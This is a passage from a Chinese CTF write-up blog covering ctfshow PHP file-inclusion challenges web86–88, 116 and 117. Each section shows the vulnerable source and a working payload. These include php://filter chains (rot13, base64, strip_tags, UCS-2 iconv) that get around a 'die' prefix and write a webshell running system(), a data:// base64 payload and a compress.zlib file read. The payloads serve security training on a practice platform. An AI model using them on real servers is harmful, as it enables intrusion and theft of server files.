        <span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'truthahn.jpg'</span><span class="token punctuation">,</span>fileBytes<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    
        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span>
</code></pre> 
<h3><a id="web86_281"></a>web86</h3> 
<pre><code class="prism language-php"><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'还要秀？'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">set_include_path</span><span class="token punctuation">(</span>还要秀？<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>设置了包含路径，但不妨碍我们脚本的运行。同web82。</p> 
<h3><a id="web87_304"></a>web87</h3> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die('大佬别秀了');?&gt;"</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>这题与之前的都不同，考察的是php的file_put_contents函数写入文件的姿势。</p> 
<p>发现语句</p> 
<pre><code class="prism language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die('大佬别秀了');?&gt;"</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>中对file参数进行了url解码，所以我们可以使用php://filter伪协议的写入操作，并进行两次url编码。又因为同时存在</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'大佬别秀了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>这句死亡代码，所以我们可以通过编码让php引擎把该代码识别成乱码，具体可以使用rot13加密：</p> 
<pre><code class="prism language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token argument-name">php</span><span class="token punctuation">:</span><span class="token comment">//filter/write=string.rot13/resource=3.php</span>
第一次url全编码：
<span class="token operator">??</span>file<span class="token operator">=</span><span class="token operator">%</span><span class="token number">70</span><span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span><span class="token number">70</span><span class="token operator">%</span><span class="token number">3</span>a<span class="token operator">%</span><span class="token number">2</span>f<span class="token operator">%</span><span class="token number">2</span>f<span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">69</span><span class="token operator">%</span><span class="token number">6</span>c<span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">2</span>f<span class="token operator">%</span><span class="token number">77</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">69</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">73</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">69</span><span class="token operator">%</span><span class="token number">6</span>e<span class="token operator">%</span><span class="token number">67</span><span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">31</span><span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">2</span>f<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">73</span><span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">70</span><span class="token operator">%</span><span class="token number">68</span><span class="token operator">%</span><span class="token number">70</span>
第二次url全编码：
<span class="token operator">?</span>file<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">30</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">38</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">30</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">39</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">63</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">34</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">35</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">39</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">34</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">35</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">64</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">34</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">39</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">34</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">31</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">35</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">35</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">35</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">64</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">30</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">38</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">37</span><span class="token operator">%</span><span class="token number">30</span>
</code></pre> 
<p>由于使用了rot13加密来混淆杂糅代码，所以我们对content也要进行rot13加密才能让php引擎正确识别：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac f*.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
rot13加密后为：
<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">=</span><span class="token function">flfgrz</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gnp s*.cuc'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>至于为什么是用rot13来加密？很简单，rot13两次加密后就会得到原文：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">flfgrz</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gnp s*.cuc'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
rot13再次加密后为：
<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac f*.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>具体<strong>payload</strong>如下：</p> 
<p><img src="https://images2.imgbox.com/ab/0d/uVVwbCXF_o.png" alt="fileincluding87encode1"></p> 
<p>编码后：</p> 
<p><img src="https://images2.imgbox.com/cc/5f/rkeUch1F_o.png" alt="fileincluding87encode2"></p> 
<p>访问3.php获取flag：</p> 
<p><img src="https://images2.imgbox.com/18/5a/jCC1vQAZ_o.png" alt="fileincluding87flag"></p> 
<p><strong>PS：<strong>当然，我们也可以使用</strong>base64解码</strong>来传入content：</p> 
<p>对于content：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
base64编码后：
PD89c3lzdGVtKCd0YWMgZionKTs<span class="token operator">/</span>Pg<span class="token operator">==</span>
</code></pre> 
<p>而根据php引擎解码base64编码的机制，死亡代码&lt;?php die('大佬别秀了');?&gt;解析时会被除去不在64个可打印字符中的字符。只剩下：phpdie。</p> 
<p>而base64算法解码时是4个byte为一组，所以我们可以在编码后的content之前加两个字符a：</p> 
<pre><code>content=aaPD89c3lzdGVtKCd0YWMgZionKTs/Pg==
</code></pre> 
<p>这样我们之后传入的webshell的baes64内容也被正常解码。详细原理请看<strong>P神</strong>的博客：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" rel="nofollow">谈一谈php://filter的妙用</a></p> 
<p>对于file：</p> 
<pre><code class="prism language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token argument-name">php</span><span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-decode/resource=3.php</span>
</code></pre> 
<p>同样两次url全编码即可。</p> 
<p><strong>payload2</strong>如下：</p> 
<p><img src="https://images2.imgbox.com/3e/30/XBeLzptb_o.png" alt="fileincluding87base64encode"></p> 
<p><strong>PS</strong>：因为php://filter伪协议支持使用多个过滤器，可使用strip_tags与base64解码组合拳的形式来实现绕过死亡代码：</p> 
<p>file：</p> 
<pre><code class="prism language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token argument-name">php</span><span class="token punctuation">:</span><span class="token comment">//filter/string.strip_tags|convert.base64-decode/resource=4.php</span>
</code></pre> 
<p>content：</p> 
<pre><code class="prism language-php">content<span class="token operator">=</span>PD89c3lzdGVtKCd0YWMgZionKTs<span class="token operator">/</span>Pg<span class="token operator">==</span>
</code></pre> 
<p><strong>payload3</strong>如下：</p> 
<p><img src="https://images2.imgbox.com/89/c8/ZOyguFnl_o.png" alt="fileincluding87base64dncodestrip_tags"></p> 
<h3><a id="web88_424"></a>web88</h3> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>发现这个语句没有过滤字母、正斜杠和冒号’:’，但过滤了等于’=‘号和加’+'号。所以我们可以使用data伪协议和base64编码。我们可以找一个编码后不会有等于号和加号的查询flag的命令：</p> 
<p>我找的是：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac f*.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>编码后为：</p> 
<pre><code class="prism language-php">PD89c3lzdGVtKCd0YWMgZioucGhwJyk7
</code></pre> 
<p>具体payload如下：</p> 
<pre><code class="prism language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token argument-name">data</span><span class="token punctuation">:</span><span class="token comment">//text/plain;base64,PD89c3lzdGVtKCd0YWMgZioucGhwJyk7</span>
</code></pre> 
<p>EXECUTE得到flag：</p> 
<p><img src="https://images2.imgbox.com/fd/ec/UBWB8TiP_o.png" alt="fileincluding88flag"></p> 
<h3><a id="web116_462"></a>web116</h3> 
<p>提示是misc+lfi(Local File Include)，发现可以使用file参数访问服务器本地文件。</p> 
<p>PS：视频剪得真好♪(´▽｀)</p> 
<p><strong>payload</strong>：</p> 
<pre><code class="prism language-php"><span class="token operator">?</span>file<span class="token operator">=</span>flag<span class="token operator">.</span>php
</code></pre> 
<p>访问payload，ctrl+s保存mp4，用010打开即可（当然也可以用burp抓包）。</p> 
<p><img src="https://images2.imgbox.com/3b/1e/qpPheMXo_o.png" alt="fileincluding116flag"></p> 
<p>也有payload是这样的：</p> 
<pre><code class="prism language-php"><span class="token operator">?</span>file<span class="token operator">=</span>compress<span class="token operator">.</span><span class="token argument-name">zlib</span><span class="token punctuation">:</span><span class="token comment">///var/www/html/flag.php</span>
</code></pre> 
<p>同样可以得到flag。不过大佬好像是直接分析首页mp4视频，进行块拼接啥的得到源码。个人不太会misc，以后找个时间研究研究。</p> 
<h3><a id="web117_486"></a>web117</h3> 
<pre><code class="prism language-php"><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contents'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die();?&gt;"</span><span class="token operator">.</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>死亡代码绕过的本质就是使死亡代码过滤为不可执行的代码或出错的代码，将我们的webshell转化为可执行的代码。</p> 
<p>这题过滤了base64、rot13、string等常见编码或函数，我们可以用其他的编码来达到目的。</p> 
<p>php支持的编码可参见：<a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php" rel="nofollow">PHP 扩展支持的字符编码</a></p> 
<p>file：</p> 
<pre><code class="prism language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token argument-name">php</span><span class="token punctuation">:</span><span class="token comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=7.php</span>
</code></pre> 
<p>iconv.UCS-2LE.UCS-2BE编码就是把每两位字符换位。</p> 
<p>很简单的编码小脚本：</p> 
<pre><code class="prism language-python"><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"&lt;?=system('tac f*');"</span>
str_encoded <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        str_encoded <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        str_encoded <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>str_encoded<span class="token punctuation">)</span> 		<span class="token comment"># ?&lt;s=syet(mt'caf '*;)</span>
</code></pre> 
<p>contents：</p> 
<pre><code>contents=?&lt;s=syet(mt'caf '*;)
</code></pre> 
<p>访问7.php即可：</p> 
<p><img src="https://images2.imgbox.com/f6/a2/d8iQ8JAa_o.png" alt="fileincluding117flag2"></p> 
<h4><a id="_536"></a>参考视频</h4> 
<p>B站BV号：BV1P64y1Q72q</p> 
<h4><a id="_540"></a>参考博客</h4> 
<p><a href="https://blog.csdn.net/weixin_46330722/article/details/111657006">session_upload进行文件包含</a></p> 
<p><a href="https://blog.csdn.net/weixin_36304806/article/details/116015347">php竞争漏洞</a></p> 
<p><a href="https://xz.aliyun.com/t/8163" rel="nofollow">死亡代码绕过</a></p> 
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" rel="nofollow">谈一谈php://filter的妙用</a></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/169a83020517f3935f9752f349a6eea5/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">有没有使cpu始终达到100%的测试软件,让CPU使用率达到100%的方法 压力测试性能</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/8f85e4cd7532e954053127af5325d2e0/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">计算机市场环境分析报告,计算机职业环境分析报告-计算机职业环境分析.doc</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>